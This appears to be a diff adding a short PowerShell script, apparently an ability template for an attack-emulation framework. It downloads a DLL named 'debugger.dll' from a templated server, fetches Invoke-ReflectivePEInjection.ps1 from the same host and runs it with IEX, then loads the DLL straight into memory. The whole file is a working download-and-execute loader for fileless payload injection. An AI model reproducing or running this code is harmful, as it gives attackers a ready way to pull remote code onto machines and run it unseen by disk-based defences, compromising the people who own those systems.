@@ -1,0 +1,8 @@
+$url="#{server}/file/download";
+$wc=New-Object System.Net.WebClient;
+$wc.Headers.add("file","debugger.dll");
+$PBytes = $wc.DownloadData($url);
+$wc1 = New-Object System.net.webclient;
+$wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1");
+IEX ($wc1.DownloadString($url));
+Invoke-ReflectivePEInjection -PBytes $PBytes -verbose
